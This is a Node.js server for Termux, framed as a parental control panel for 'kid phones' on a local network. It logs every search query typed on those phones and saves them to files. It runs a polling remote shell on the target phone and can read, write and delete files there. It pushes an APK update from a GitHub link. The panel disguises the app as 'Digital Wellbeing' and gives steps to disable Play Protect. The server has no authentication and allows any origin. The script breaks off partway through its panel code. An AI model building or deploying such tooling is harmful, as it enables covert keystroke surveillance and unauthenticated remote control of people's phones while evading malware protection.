#!/data/data/com.termux/files/usr/bin/node
// Termux Control Panel API Server
// Listens on LAN and exposes endpoints to control device + track kids' typing

const http = require('http');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const PORT = 8080;
const HOST = '0.0.0.0';
const DATA_DIR = '/data/data/com.termux/files/home/.termux-mcp';
const IPS_FILE = path.join(DATA_DIR, 'ips.json');
const DOCS_DIR = path.join(DATA_DIR, 'kid-documents');
const LOG_FILE = '/tmp/opencode/all-searches.log';

fs.mkdirSync(DATA_DIR, { recursive: true });
fs.mkdirSync(DOCS_DIR, { recursive: true });
fs.mkdirSync('/tmp/opencode', { recursive: true });

// ---------- persistence ----------
function loadIPS() {
  try { return JSON.parse(fs.readFileSync(IPS_FILE, 'utf8')); }
  catch { return {}; }
}
function saveIPS(ips) {
  fs.writeFileSync(IPS_FILE, JSON.stringify(ips, null, 2));
}

// ---------- runtime state ----------
// kidsByIP[ip] = { nickname, lastSeen, lastQuery, buffer: [ {time, text} ], docCount }
let kidsByIP = {};
let usage = {};   // ip -> {pkg: seconds}
let limits = {};  // ip -> {pkg: minutes/day}
const KID_DOC_INTERVAL_MS = 20 * 60 * 1000; // flush typing buffer every 20 minutes
let lastFlush = Date.now();

function ensureKid(ip) {
  if (!ip) ip = 'unknown';
  if (!kidsByIP[ip]) kidsByIP[ip] = { buffer: [], docCount: 0, lastSeen: Date.now() };
  kidsByIP[ip].lastSeen = Date.now();
  return kidsByIP[ip];
}

function nicknameFor(ip) {
  const k = kidsByIP[ip];
  return (k && k.nickname) || 'kid';
}

function flushKidDocuments(force = false) {
  const now = Date.now();
  if (!force && now - lastFlush < KID_DOC_INTERVAL_MS) return [];
  lastFlush = now;
  const saved = [];
  for (const [ip, kid] of Object.entries(kidsByIP)) {
    if (kid.buffer.length === 0) continue;
    kid.docCount += 1;
    const stamp = new Date(now).toISOString().replace(/[:.]/g, '-').slice(0, 19);
    const name = nicknameFor(ip);
    const file = path.join(DOCS_DIR, `${name}${kid.docCount}_${ip}_${stamp}.md`);
    const lines = [
      `# ${name} — ${ip}`,
      `# ${new Date(now).toISOString()} (${kid.buffer.length} entries)`,
      '',
      ...kid.buffer.map(e => `- [${e.time}] ${e.text}`),
      ''
    ];
    fs.writeFileSync(file, lines.join('\n'));
    saved.push(file);
    kid.buffer = [];
  }
  return saved;
}
setInterval(() => flushKidDocuments().forEach(f => console.log(`💾 saved kid doc: ${f}`)), 60 * 1000);

// ---------- helpers ----------
function run(cmd, timeout = 15000) {
  return new Promise((resolve) => {
    exec(cmd, { timeout }, (err, stdout, stderr) => {
      if (err) resolve({ ok: false, error: (stderr || err.message).trim(), code: err.code });
      else resolve({ ok: true, out: stdout.trim() });
    });
  });
}

function readBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => resolve(body));
  });
}

function send(res, code, obj) {
  res.writeHead(code, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(obj));
}

// device control (all Termux API backed)
async function cmdFlashlight() {
  const cur = await run('timeout 15 termux-torch off --help 2>/dev/null; echo', 5000);
  // torch has no "get" — track toggle state server-side
  flashlightState = !flashlightState;
  const r = await run(`timeout 20 termux-torch ${flashlightState ? 'on' : 'off'}`);
  return r.ok ? { ok: true, flashlight: flashlightState ? 'on' : 'off' } : { ok: false, error: r.error };
}
let flashlightState = false;

// ---------- remote shell / files (kid app polls us via /term/poll) ----------
// termQueue[ip]   -> [{id, cmd, kind, ts}] commands waiting for the app
// termResults[ip] -> [{id, out, ts}]        fresh results, consumed by callers
// termHistory[ip] -> [{id, out, ts}]        ring buffer of everything
const termQueue = {};
const termResults = {};
const termHistory = {};

function termEnqueue(kIp, cmd, kind) {
  if (!termQueue[kIp]) termQueue[kIp] = [];
  const entry = { id: 'e' + Date.now() + Math.random().toString(36).slice(2, 6), cmd, kind, ts: Date.now() };
  termQueue[kIp].push(entry);
  return entry.id;
}

function termPushResult(kIp, out, id) {
  if (!termResults[kIp]) termResults[kIp] = [];
  const entry = { id: id || null, out: String(out || ''), ts: Date.now() };
  termResults[kIp].push(entry);
  if (termResults[kIp].length > 100) termResults[kIp].shift();
  if (!termHistory[kIp]) termHistory[kIp] = [];
  termHistory[kIp].push(entry);
  if (termHistory[kIp].length > 100) termHistory[kIp].shift();
}

function termTakeResult(kIp, id, waitMs) {
  return new Promise((resolve) => {
    const started = Date.now();
    const timer = setInterval(() => {
      const arr = termResults[kIp] || [];
      const idx = arr.findIndex(r => r.id === id);
      if (idx >= 0) { clearInterval(timer); resolve(arr.splice(idx, 1)[0]); }
      else if (Date.now() - started > waitMs) { clearInterval(timer); resolve(null); }
    }, 120);
  });
}

function termOnline(kIp) {
  const k = kidsByIP[kIp];
  return !!(k && Date.now() - k.lastSeen < 90000);
}

const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') { res.writeHead(200); res.end(); return; }

  const url = new URL(req.url, `http://${req.headers.host}`);
  const p = url.pathname;
  const ip = (req.socket.remoteAddress || '').replace(/^::ffff/, '');

  try {
    // ================= KID TYPING =================
    // kids' phone POSTs every typed query here
    if (p === '/kid-alert' && req.method === 'POST') {
      const body = await readBody(req);
      const params = new URLSearchParams(body);
      const query = params.get('query');
      const srcIP = params.get('ip') || ip;
      if (query) {
        const t = new Date().toISOString();
        const kid = ensureKid(srcIP);
        kid.lastQuery = query;
        kid.buffer.push({ time: t, text: query });
        fs.appendFileSync(LOG_FILE, `[${t}] ${srcIP}: ${query}\n`);
        console.log(`🔍 [${srcIP}] "${query}"`);
      }
      send(res, 200, { status: 'logged' });
      return;
    }

    // live typing — poll every 10s for the typing animation
    if (p === '/kid-typing' && req.method === 'GET') {
      const now = Date.now();
      const devices = Object.entries(kidsByIP)
        .map(([kIp, k]) => ({
          ip: kIp,
          nickname: k.nickname || null,
          unassigned: !k.nickname,
          lastQuery: k.lastQuery || null,
          lastSeen: k.lastSeen,
          online: now - k.lastSeen < 90000, // saw something <90s ago
          recent: k.buffer.slice(-20).map(e => ({ time: e.time, text: e.text })),
          docCount: k.docCount
        }));
      send(res, 200, { devices, generatedAt: now });
      return;
    }

    // history (last N log lines)
    if (p === '/kid-history' && req.method === 'GET') {
      const n = Math.min(parseInt(url.searchParams.get('n') || '50'), 500);
      let lines = [];
      try { lines = fs.readFileSync(LOG_FILE, 'utf8').trim().split('\n').slice(-n); } catch {}
      send(res, 200, { lines });
      return;
    }

    // manually flush 20-min documents now
    if (p === '/kid-save' && req.method === 'POST') {
      const saved = flushKidDocuments(true);
      send(res, 200, { saved, docsDir: DOCS_DIR });
      return;
    }

    // list saved documents
    if (p === '/kid-docs' && req.method === 'GET') {
      let files = [];
      try { files = fs.readdirSync(DOCS_DIR).filter(f => f.endsWith('.md')).sort().reverse(); } catch {}
      send(res, 200, { files, docsDir: DOCS_DIR });
      return;
    }

    // read one document: /kid-docs/<name>
    if (p.startsWith('/kid-docs/') && p !== '/kid-docs' && req.method === 'GET') {
      const fname = path.basename(decodeURIComponent(p.slice('/kid-docs/'.length)));
      const full = path.join(DOCS_DIR, fname);
      if (!full.startsWith(DOCS_DIR)) { send(res, 400, { error: 'bad path' }); return; }
      try {
        res.writeHead(200, { 'Content-Type': 'text/markdown; charset=utf-8' });
        res.end(fs.readFileSync(full, 'utf8'));
      } catch { send(res, 404, { error: 'not found' }); }
      return;
    }

    // ================= IP NICKNAMES (permanent) =================
    if (p === '/ips' && req.method === 'GET') {
      const stored = loadIPS();
      const now = Date.now();
      const list = Object.keys({ ...stored, ...kidsByIP }).map(kIp => ({
        ip: kIp,
        nickname: (kidsByIP[kIp] && kidsByIP[kIp].nickname) || stored[kIp] || null,
        online: kidsByIP[kIp] ? now - kidsByIP[kIp].lastSeen < 90000 : false,
        lastSeen: kidsByIP[kIp] ? kidsByIP[kIp].lastSeen : null
      }));
      send(res, 200, { ips: list });
      return;
    }

    // GET /ip/1.2.3.4
    if (p.match(/^\/ip\/[\d.]+$/) && req.method === 'GET') {
      const kIp = p.slice(4);
      const stored = loadIPS();
      send(res, 200, {
        ip: kIp,
        nickname: (kidsByIP[kIp] && kidsByIP[kIp].nickname) || stored[kIp] || null,
        online: kidsByIP[kIp] ? Date.now() - kidsByIP[kIp].lastSeen < 90000 : false,
        lastQuery: kidsByIP[kIp] && kidsByIP[kIp].lastQuery
      });
      return;
    }

    // POST /ip/1.2.3.4  {"nickname":"Aarav"}  — permanent
    if (p.match(/^\/ip\/[\d.]+$/) && req.method === 'POST') {
      const kIp = p.slice(4);
      const body = await readBody(req);
      let nick = '';
      try { nick = (JSON.parse(body).nickname || '').trim(); } catch {
        nick = new URLSearchParams(body).get('nickname') || '';
      }
      if (!nick) { send(res, 400, { error: 'nickname required' }); return; }
      const stored = loadIPS();
      stored[kIp] = nick;
      saveIPS(stored);
      const kid = ensureKid(kIp);
      kid.nickname = nick;
      console.log(`🏷️ ${kIp} -> "${nick}"`);
      send(res, 200, { ok: true, ip: kIp, nickname: nick, saved: IPS_FILE });
      return;
    }

    // ================= CONNECTION CHECK =================
    // the control panel UI calls this as soon as it opens
    if (p === '/check' && req.method === 'GET') {
      const now = Date.now();
      const connected = Object.entries(kidsByIP)
        .filter(([, k]) => now - k.lastSeen < 90000)
        .map(([kIp, k]) => ({
          ip: kIp,
          nickname: k.nickname || null,
          unassigned: !k.nickname,
          lastSeen: k.lastSeen,
          lastQuery: k.lastQuery
        }));
      const unassigned = connected.filter(d => !d.nickname);
      send(res, 200, {
        ok: true,
        connected,
        unassigned,
        // the exact message the panel should surface:
        message: connected.length
          ? unassigned.length
            ? `A phone has connected (${unassigned.map(d => d.ip).join(', ')}) — set a nickname to continue.`
            : `${connected.length} kid phone(s) connected.`
          : 'No phones connected yet.'
      });
      return;
    }

    // kids' phone pings here on boot / every 20s so /check sees it immediately
    if (p === '/connect' && req.method === 'POST') {
      const body = await readBody(req);
      const params = new URLSearchParams(body);
      const srcIP = params.get('ip') || ip;
      const kid = ensureKid(srcIP);
      console.log(`🔌 phone connected: ${srcIP}`);
      send(res, 200, { ok: true, ip: srcIP, nickname: kid.nickname || null, setNickname: !kid.nickname });
      return;
    }

    // ============ APP USAGE + SCREEN-TIME LIMITS ============
    if (p === '/usage' && req.method === 'POST') {
      const body = await readBody(req);
      const who = url.searchParams.get('ip') || ip;
      try {
        const apps = JSON.parse(body || '{}');
        Object.keys(apps).forEach(k => apps[k] = +apps[k] || 0);
        usage[who] = Object.assign({}, usage[who], apps);
        send(res, 200, { ok: true, saved: who });
      } catch (e) { send(res, 400, { ok: false, error: 'body is not JSON' }); }
      return;
    }
    if (p === '/usage' && req.method === 'GET') {
      const who = url.searchParams.get('ip') || ip;
      send(res, 200, { ip: who, usage: usage[who] || {} });
      return;
    }
    if (p === '/limits' && req.method === 'GET') {
      const who = url.searchParams.get('ip') || ip;
      send(res, 200, limits[who] || {});
      return;
    }
    if (p.startsWith('/limits/') && req.method === 'POST') {
      const who = p.slice(8) || ip;
      const body = await readBody(req);
      let params;
      try { params = body.startsWith('{') ? JSON.parse(body) : JSON.parse(new URLSearchParams(body).get('data') || '{}'); }
      catch (e) { params = null; }
      if (!params || !params.pkg) { send(res, 400, { ok: false, error: 'send {pkg, min}' }); return; }
      limits[who] = limits[who] || {};
      if (!params.min || params.min <= 0) delete limits[who][params.pkg];
      else limits[who][params.pkg] = +params.min;
      send(res, 200, { ok: true, ip: who, limits: limits[who] });
      return;
    }

    // ================= DEVICE TOGGLES (Termux API) =================
    if (p === '/toggle/flashlight' && req.method === 'GET') {
      send(res, 200, await cmdFlashlight());
      return;
    }
    if (p === '/flashlight' && req.method === 'GET') {
      const v = url.searchParams.get('on') !== 'false';
      flashlightState = v;
      const r = await run(`timeout 20 termux-torch ${v ? 'on' : 'off'}`);
      send(res, 200, r.ok ? { ok: true, flashlight: v ? 'on' : 'off' } : { ok: false, error: r.error });
      return;
    }
    if (p === '/set/brightness' && req.method === 'GET') {
      const v = parseInt(url.searchParams.get('value') || '128');
      if (isNaN(v) || v < 0 || v > 255) { send(res, 400, { error: 'value must be 0-255' }); return; }
      const r = await run(`timeout 20 termux-brightness ${v}`);
      send(res, 200, r.ok && !r.out.includes('error')
        ? { ok: true, brightness: v }
        : { ok: false, error: r.out || r.error, hint: 'Grant "Modify system settings" to Termux:API in Android Settings' });
      return;
    }
    if (p === '/toggle/vibrate' && req.method === 'GET') {
      const r = await run('timeout 15 termux-vibrate');
      send(res, 200, r.ok ? { ok: true, vibrate: 'fired' } : { ok: false, error: r.error });
      return;
    }
    if (p === '/screenshot' && req.method === 'GET') {
      const file = `/tmp/opencode/shot_${Date.now()}.png`;
      const r = await run(`timeout 30 termux-screenshot -f "${file}" 2>/dev/null || timeout 30 /system/bin/screencap -p "${file}"`, 35000);
      if (r.ok && fs.existsSync(file) && fs.statSync(file).size > 0) {
        res.writeHead(200, { 'Content-Type': 'image/png' });
        res.end(fs.readFileSync(file));
      } else {
        send(res, 500, { ok: false, error: r.out || r.error || 'screenshot empty', hint: 'termux-screenshot is missing from this Termux API build — install latest termux-api apk' });
      }
      return;
    }
    if (p === '/battery' && req.method === 'GET') {
      const r = await run('timeout 15 termux-battery-status');
      try { send(res, 200, JSON.parse(r.out)); } catch { send(res, 200, { ok: true, raw: r.out }); }
      return;
    }

    // ================= REMOTE SHELL (kid app polls /term/poll) =================
    // app fetches one queued command
    if (p === '/term/poll' && req.method === 'GET') {
      const kIp = url.searchParams.get('ip') || ip;
      termQueue[kIp] ||= [];
      const entry = termQueue[kIp].shift() || null;
      send(res, 200, { cmd: entry ? entry.cmd : null, id: entry ? entry.id : null, kind: entry ? entry.kind : null });
      return;
    }

    // app posts a result back
    if (p === '/term/result' && req.method === 'POST') {
      const kIp = url.searchParams.get('ip') || ip;
      const body = await readBody(req);
      try {
        const j = JSON.parse(body);
        termPushResult(kIp, j.out, j.id);
        ensureKid(kIp); // any shell traffic keeps the phone "online" too
      } catch {
        termPushResult(kIp, body, null);
      }
      send(res, 200, { ok: true });
      return;
    }

    // panel sends a command to a kid phone
    if (p === '/term/cmd' && req.method === 'POST') {
      const kIp = url.searchParams.get('ip') || ip;
      const body = await readBody(req);
      let cmd = '';
      try { cmd = (JSON.parse(body).cmd || '').trim(); } catch { cmd = new URLSearchParams(body).get('cmd') || ''; }
      if (!cmd) { send(res, 400, { error: 'cmd required' }); return; }
      // keep server-side limits in sync when the parent types "limit <pkg> <min|off>"
      if (cmd.startsWith('limit ')) {
        const parts = cmd.slice(6).trim().split(/\s+/);
        if (parts.length === 2) {
          const pkg = parts[0];
          const mins = parts[1].toLowerCase() === 'off' ? 0 : (parseInt(parts[1], 10) || 0);
          limits[kIp] = limits[kIp] || {};
          if (pkg.toLowerCase() === 'all') limits[kIp] = {};
          else if (mins > 0) limits[kIp][pkg] = mins;
          else delete limits[kIp][pkg];
        }
      }
      const id = termEnqueue(kIp, cmd, 'sh');
      console.log(`🖥 [${kIp}] $ ${cmd}`);
      send(res, 200, { ok: true, id, ip: kIp, online: termOnline(kIp) });
      return;
    }

    // panel reads what came back
    if (p === '/term/history' && req.method === 'GET') {
      const kIp = url.searchParams.get('ip') || ip;
      send(res, 200, { results: (termHistory[kIp] || []).slice(-50).reverse(), online: termOnline(kIp) });
      return;
    }

    // ================= FILES (kid phone file browser, app-specific dirs) =================
    if (p === '/files/list' && req.method === 'GET') {
      const kIp = url.searchParams.get('ip');
      const dir = url.searchParams.get('path') || '/';
      if (!kIp) { send(res, 400, { error: '?ip= required' }); return; }
      const id = termEnqueue(kIp, 'flist ' + dir, 'flist');
      const out = await termTakeResult(kIp, id, 6000);
      if (!out) { send(res, 504, { error: 'kid phone did not answer (app running?)', ip: kIp, online: termOnline(kIp) }); return; }
      try { send(res, 200, JSON.parse(out.out)); }
      catch { send(res, 200, { path: dir, lines: out.out.split('\n') }); }
      return;
    }

    if (p === '/files/read' && req.method === 'GET') {
      const kIp = url.searchParams.get('ip');
      const file = url.searchParams.get('path');
      if (!kIp || !file) { send(res, 400, { error: '?ip= and ?path= required' }); return; }
      const id = termEnqueue(kIp, 'fread ' + file, 'fread');
      const out = await termTakeResult(kIp, id, 8000);
      if (!out) { send(res, 504, { error: 'kid phone did not answer', ip: kIp }); return; }
      try { send(res, 200, JSON.parse(out.out)); }
      catch { send(res, 200, { path: file, text: out.out }); }
      return;
    }

    if (p === '/files/write' && req.method === 'POST') {
      const kIp = url.searchParams.get('ip');
      const body = await readBody(req);
      let j = null; try { j = JSON.parse(body); } catch {}
      if (!kIp || !j || !j.path) { send(res, 400, { error: '?ip= and JSON {path, text|b64} required' }); return; }
      const b64 = j.b64 || Buffer.from(String(j.text || '').replace(/\r/g, ''), 'utf8').toString('base64');
      if (b64.length > 1024 * 1024) { send(res, 413, { error: 'file too large (max ~780KB payload)' }); return; }
      const id = termEnqueue(kIp, 'fwrite ' + j.path + ' ' + b64, 'fwrite');
      const out = await termTakeResult(kIp, id, 10000);
      if (!out) { send(res, 504, { error: 'kid phone did not answer', ip: kIp }); return; }
      try { send(res, 200, JSON.parse(out.out)); }
      catch { send(res, 200, { ok: false, raw: out.out }); }
      return;
    }

    if (p === '/files/delete' && req.method === 'GET') {
      const kIp = url.searchParams.get('ip');
      const file = url.searchParams.get('path');
      if (!kIp || !file) { send(res, 400, { error: '?ip= and ?path= required' }); return; }
      const id = termEnqueue(kIp, 'fdelete ' + file, 'fdelete');
      const out = await termTakeResult(kIp, id, 6000);
      if (!out) { send(res, 504, { error: 'kid phone did not answer', ip: kIp }); return; }
      try { send(res, 200, JSON.parse(out.out)); }
      catch { send(res, 200, { ok: false, raw: out.out }); }
      return;
    }

    // ================= SERVICE MANAGEMENT =================
    const svcUp = async (name) => { const r = await run(`pgrep -f "${name}"`); return r.ok && r.out.length > 0; };
    if (p === '/status') {
      const [freellmapi, proxy, termuxMcp] = await Promise.all([
        svcUp('server/dist/index.js'), svcUp('proxy.mjs'), svcUp('termux-mcp')
      ]);
      const [cpu, mem, storage] = await Promise.all([
        run('cat /proc/loadavg').then(r => r.out.split(' ')[0]),
        run('free -m').then(r => r.out.split('\n')[1].split(/\s+/).slice(1, 4)),
        run('df -h /data | tail -1').then(r => r.out.split(/\s+/)[4])
      ]);
      send(res, 200, { freellmapi, proxy, termuxMcp, stats: { cpu, mem: { used: mem[1], free: mem[2], total: mem[0] }, storage_used: storage }, timestamp: Date.now() });
      return;
    }
    if (p === '/start/freellmapi') { const r = await run('nohup /data/data/com.termux/files/home/freellmapi/start.sh >> /tmp/opencode/freellmapi.log 2>&1 &'); send(res, 200, { ok: true }); return; }
    if (p === '/stop/freellmapi') { const r = await run('pkill -f "server/dist/index.js"'); send(res, 200, { ok: r.ok }); return; }
    if (p === '/start/proxy') { const r = await run('nohup /data/data/com.termux/files/home/zen-failover/start.sh >> /tmp/opencode/failover.log 2>&1 &'); send(res, 200, { ok: true }); return; }
    if (p === '/stop/proxy') { const r = await run('pkill -f "proxy.mjs"'); send(res, 200, { ok: r.ok }); return; }
    if (p === '/start/stack') { const r = await run('/data/data/com.termux/files/home/start-llm-stack.sh', 30000); send(res, 200, { ok: true, output: r.out }); return; }
    if (p === '/logs/freellmapi') {
      try { res.writeHead(200, {'Content-Type':'text/plain'}); res.end(fs.readFileSync('/tmp/opencode/freellmapi-server.log','utf8').split('\n').slice(-50).join('\n')); }
      catch { send(res, 200, { logs: '' }); }
      return;
    }
    if (p === '/logs/proxy') {
      try { res.writeHead(200, {'Content-Type':'text/plain'}); res.end(fs.readFileSync('/tmp/opencode/failover-proxy.log','utf8').split('\n').slice(-50).join('\n')); }
      catch { send(res, 200, { logs: '' }); }
      return;
    }

    // ================= CONTROL PANEL WEB UI =================
    if (p === '/' || p === '/panel' || p === '/index.html') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(PANEL_HTML);
      return;
    }

    send(res, 404, { error: 'not found' });
  } catch (e) {
    send(res, 500, { error: e.message || 'internal error' });
  }
});

server.listen(PORT, HOST, () => {
  console.log(`Termux Control API listening on http://0.0.0.0:${PORT}`);
});

const PANEL_HTML = `<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Control Panel</title>
<style>
 body{font-family:system-ui,sans-serif;background:#0d1117;color:#e6edf3;margin:0;padding:16px}
 h1{font-size:18px} h2{font-size:14px;color:#8b949e;margin:18px 0 8px}
 .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;margin-bottom:12px}
 button{background:#238636;color:#fff;border:0;border-radius:6px;padding:8px 14px;margin:4px 4px 4px 0;cursor:pointer;font-size:14px}
 button.gray{background:#30363d} button.warn{background:#da3633}
 .row{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
 #typing{font-family:monospace;white-space:pre-wrap;background:#010409;border:1px solid #30363d;border-radius:6px;padding:10px;min-height:70px;font-size:13px}
 .cursor{display:inline-block;width:8px;background:#58a6ff;animation:blink 1s steps(1) infinite}
 @keyframes blink{50%{opacity:0}}
 .dev{margin:6px 0;padding:8px;background:#010409;border-radius:6px}
 .badge{font-size:11px;padding:2px 8px;border-radius:10px;background:#1f6feb}
 .badge.off{background:#6e40c9}
 input{background:#010409;color:#e6edf3;border:1px solid #30363d;border-radius:6px;padding:6px;font-size:14px}
 .msg{padding:8px;border-radius:6px;margin-bottom:8px;font-size:13px}
 .msg.ok{background:#12261e;border:1px solid #238636}
 .msg.warn{background:#2d1a1f;border:1px solid #da3633}
 .small{font-size:11px;color:#8b949e}
 select,textarea{background:#010409;color:#e6edf3;border:1px solid #30363d;border-radius:6px;padding:6px;font-size:14px}
 #fList .frow{padding:4px 6px;border-bottom:1px solid #21262d;display:flex;align-items:center;gap:8px}
 #fList button{padding:2px 10px;font-size:12px}
</style></head><body>
<h1>🛡️ Termux Control Panel</h1>
<div id="connmsg"></div>

<div class="card"><h2>🔌 Connected phones — switch to control each</h2>
 <div id="phones"></div>
 <div class="small" id="phonesNote"></div>
</div>

<div class="card"><h2>📱 Kid phones (live — refreshes every 10s)</h2><div id="kids"></div></div>

<div class="card"><h2>⚡ Device controls (this phone)</h2>
 <div class="row">
  <button onclick="get('/toggle/flashlight')">💡 Flashlight toggle</button>
  <button onclick="get('/set/brightness?value=128')">☀️ Brightness 128</button>
  <button onclick="get('/toggle/vibrate')">📳 Vibrate</button>
  <button onclick="shot()">📷 Screenshot</button>
 </div>
 <div class="small" id="devres"></div>
</div>

<div class="card"><h2>📁 Files on kid phone</h2>
 <div class="row">
  <select id="filePhone" onchange="Files.list()"></select>
  <input id="filePath" value="/" size="22" onchange="Files.list()">
  <button onclick="Files.list()">List</button>
  <button class="gray" onclick="Files.up()">⬆ Up</button>
 </div>
 <div class="row">
  <button onclick="Files.view()">View file</button>
  <button class="warn" onclick="Files.del()">Delete</button>
 </div>
 <textarea id="fContent" rows="5"></textarea>
 <div class="row">
  <input id="fSavePath" size="22" value="/hello-from-panel.txt">
  <button onclick="Files.write()">Save this text to phone</button>
 </div>
 <div id="fList"></div>
 <div id="fOut" class="small">—</div>
</div>

<div class="card"><h2>🧪 Remote terminal + basic tools (kid phone)</h2>
 <div class="row">
  <input id="termIP" size="14" placeholder="kid-ip">
  <input id="termCmd" size="26" placeholder="shell command">
  <button onclick="Term.run()">Run</button>
  <button class="gray" onclick="Term.hist()">History</button>
 </div>
 <div class="row">
  <button class="gray" onclick="Term.tool('sh pm list packages -3')">📱 List installed apps</button>
  <button class="gray" onclick="Term.tool('sh am start -n com.whatsapp/.Main')">▶️ Launch WhatsApp</button>
  <button class="warn" onclick="Term.tool('sh am force-stop com.whatsapp')">⛔ Close WhatsApp</button>
 </div>
 <div class="row">
  <button class="gray" onclick="Term.tool('sh dumpsys battery')">🔋 Battery</button>
  <button class="gray" onclick="Term.tool('sh ls /sdcard/')">📂 SD card files</button>
  <button class="gray" onclick="Term.tool('sh logcat -d -t 20')">📋 Recent events</button>
  <button class="gray" onclick="Term.tool('sh du -sh /sdcard/Android/media/* 2>/dev/null | head -8')">💾 Media sizes</button>
 </div>
 <div class="row">
  <button class="gray" onclick="Term.tool('sh am start -a android.intent.action.VIEW -d dw://open')">⚙️ Open kid app status screen</button>
 </div>
 <div id="termOut" class="small">—</div>
</div>

<div class="card"><h2>⬆️ Update kid phone app (OTA)</h2>
 <div class="row">
  <input id="apkUrl" size="34" value="https://github.com/V4TIME/Setup/raw/master/app/build/outputs/apk/release/app-release.apk">
  <button onclick="OTA.send()">Send update to selected phone</button>
 </div>
 <div class="small" id="otaOut">Terminal stays open; the app downloads the APK and Android shows the install prompt on the kid phone. Needs 'Install unknown apps' allowed once for Digital Wellbeing on that phone.</div>
</div>

<div class="card"><h2>🛡️ Play Protect — why blocked &amp; how to allow</h2>
 <div class="small">Google flags debug-signed sideloads. This app is now <b>released-signed</b> (not debug). If Play Protect still warns on install on the kid phone: tap <b>Install anyway</b> → <b>Don't send / More details</b>. Or: Play Store app → tap avatar → <b>Play Protect</b> → ⚙️ → turn off <b>"Scan apps with Play Protect"</b>, install, turn back on. Fake warnings about "Digital Wellbeing" are generic — the signature is unique to us.</div>
</div>

<div class="card"><h2>⏱️ App screen-time &amp; limits (kid phone)</h2>
 <div class="small" id="usageOut">—</div>
 <div class="row">
  <input id="limPkg" size="20" placeholder="com.android.chrome">
  <input id="limMin" size="4" placeholder="30">
  <button onclick="Lim.set()">Set daily limit (min)</button>
 </div>
 <div class="small">App gets locked back to the home screen once the daily minutes are used up. 'limit off' from the terminal card clears one.</div>
</div>

<div class="card"><h2>💾 Kid typing documents</h2>
 <div class="row"><button class="gray" onclick="get('/kid-save')">Save now (20-min rule)</button>
 <button class="gray" onclick="loadDocs()">Refresh list</button></div>
 <div id="docs" class="small"></div>
</div>

<script>
function get(p){fetch(p).then(r=>r.json()).then(d=>{document.getElementById('devres').textContent=JSON.stringify(d)}).catch(e=>{document.getElementById('devres').textContent='ERR '+e})}
function shot(){window.open('/screenshot','_blank')}
function loadDocs(){fetch('/kid-docs').then(r=>r.json()).then(d=>{document.getElementById('docs').innerHTML=d.files.map(f=>'<div>📄 '+f+'</div>').join('')||'(none yet)'})}
async function checkConn(){
 const r=await fetch('/check').then(r=>r.json());
 document.getElementById('connmsg').innerHTML=r.unassigned.length
  ? '<div class="msg warn">📲 Your kid phone has connected: <b>'+r.unassigned.map(d=>d.ip).join(', ')+'</b> — set a nickname:</div>'
  : (r.connected.length?'<div class="msg ok">✅ '+(r.connected.map(d=>d.nickname+d.ip).join(', '))+' connected</div>':'');
}
async function setNick(ip){
 const n=prompt('Nickname for '+ip+':');if(!n)return;
 await fetch('/ip/'+ip,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nickname:n})});
 loadKids();checkConn();
}
let selectedIP = null;
function selectPhone(ip){
  selectedIP = ip;
  document.getElementById('phones').querySelectorAll('button').forEach(b=>b.style.background='#30363d');
  const b = document.querySelector('button[data-ip="'+ip+'"]');
  if(b) b.style.background='#238636';
  document.getElementById('devres').textContent = 'Controlling: '+ip;
}
async function loadPhones(){
  const d=await fetch('/ips').then(r=>r.json());
  const el=document.getElementById('phones');
  el.innerHTML=d.ips.map(k=>'<button data-ip="'+k.ip+'" onclick="selectPhone(\\''+k.ip+'\\')">'+(k.nickname||k.ip)+'</button>').join('')||'<div class="small">No phones connected yet. Install the APK on the 2nd phone.</div>';
  document.getElementById('phonesNote').textContent = d.ips.length ? 'Tap a phone to control it.' : 'Install the APK on the 2nd phone, then it appears here.';
  if(d.ips.length && !selectedIP) selectPhone(d.ips[0].ip);
}
async function loadKids(){
 const d=await fetch('/kid-typing').then(r=>r.json());
 const el=document.getElementById('kids');
 el.innerHTML=d.devices.map(k=>{
  const txt=(k.lastQuery||'')+'<span class="cursor"> </span>';
  const recent=k.recent.map(e=>'<div class="small">['+e.time.slice(11,19)+'] '+e.text+'</div>').join('');
  return '<div class="dev"><div class="row"><span class="badge '+(k.online?'':'off')+'">'+(k.nickname||'unassigned')+' — '+k.ip+'</span>'
   +(k.unassigned?'<button class="warn" onclick="setNick(\\''+k.ip+'\\')">Set nickname</button>':'')+'</div>'
   +'<div id="typing">'+(k.lastQuery?txt:'(nothing typed yet)')+'</div><div>'+recent+'</div></div>';
 }).join('')||'<div class="small">No phones have connected yet. Install the APK on the 2nd phone.</div>';
}
const Files = {
  async list(p){
    const ip=document.getElementById('filePhone').value;
    if(!ip){fmsg('No kid phone connected yet');return;}
    const path=(typeof p==='string'&&p)?p:RP();
    document.getElementById('filePath').value=path;
    fmsg('… listing '+path+' on '+ip);
    const d=await fetch('/files/list?ip='+encodeURIComponent(ip)+'&path='+encodeURIComponent(path)).then(r=>r.json()).catch(e=>({error:String(e)}));
    if(d.error){fmsg('⛔ '+d.error);return;}
    const rows=(d.entries||[]).map(e=>{
      const full=(path==='/'?'':path.replace(/\/+$/,''))+'/'+e.n;
      if(e.d){return '<div class="frow">📂 <b>' + e.n + '</b><button data-f="open" data-p="'+full+'">Open</button></div>';}
      return '<div class="frow">📄 ' + e.n + ' <span class="small">'+e.size+'</span><button data-f="open" data-p="'+full+'">Load</button></div>';
    }).join('') || '<div class="small">(empty)</div>';
    document.getElementById('fList').innerHTML=rows;
    fmsg('✅ '+ (d.entries||[]).length +' entries — '+ path);
  },
  async up(){
    const p=RP().replace(/\/+$/,'').split('/');
    p.pop();
    Files.list(p.join('/')||'/');
  },
  async view(p){
    const ip=document.getElementById('filePhone').value;
    const path=p||RP();
    fmsg('… loading '+path);
